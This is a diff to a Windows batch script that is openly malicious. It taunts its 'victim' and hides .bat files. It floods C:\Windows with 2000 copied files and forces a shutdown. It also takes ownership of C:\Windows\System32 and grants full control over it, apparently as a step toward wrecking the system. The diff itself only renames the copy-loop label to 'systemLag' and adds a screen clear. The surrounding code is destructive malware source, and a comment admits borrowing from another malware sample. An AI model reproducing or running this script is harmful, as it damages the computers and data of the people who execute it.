@@ -49,7 +49,7 @@ attrib +s +h %userprofile%\desktop\*.bat
 cls
 echo Do you want to restart your computer? :) There is a surprise... for you...
 set /p input=
-if /i %input%==yes goto finialize
+if /i %input%==yes goto systemLag
 if /i %input%==no goto gethaxor
 if not /i %input%==yes,no goto gethaxor
 
@@ -59,10 +59,10 @@ echo As you wish, fellow victim ;) I will leave your system alone...
 rem stole FlyTech's 000.exe code because I don't know how to copy 1000 files at my own
 set /a cr=0
 
-:copy
+:systemLag
 copy %userprofile%\Desktop\ARCHERHACKERSDATA\re.txt C:\Windows\ArcherHackers\hiddenfile_%cr%.txt
 set /a cr=%cr%+1
-if not %cr%==2000 goto copy
+if not %cr%==2000 goto systemLag
 
 shutdown /s /t 10
 exit
@@ -71,6 +71,7 @@ exit
 cls
 echo Now you will be punished ;)
 pause > nul
+cls
 echo I warned you, don't run this!
 echo I have even more of a surprise if you start your system ;)
 takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant "%username%:F"
